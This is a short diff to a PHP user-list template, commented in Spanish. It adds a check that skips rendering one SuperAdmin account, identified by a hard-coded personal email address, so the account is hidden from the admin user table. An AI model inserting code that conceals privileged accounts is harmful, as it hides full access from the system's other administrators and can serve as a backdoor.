@@ -41,7 +41,13 @@
                 <?php else: ?>
                     <tbody>
                         <?php foreach($usuarios as $u): ?>
-                            <?php $esActivo = ($u['deleted_at'] === null); ?>
+                            <?php 
+                            // 🔥 FIX DE INCÓGNITO: Ocultar mi cuenta SuperAdmin principal (Usa tu correo real aquí)
+                            if ($u['correo'] === 'ferreiraortegajorgeandres@gmail.com') {
+                                continue; 
+                            }
+                            $esActivo = ($u['deleted_at'] === null); 
+                            ?>
                             
                             <tr class="<?= !$esActivo ? 'table-secondary text-muted' : '' ?>">
                                 
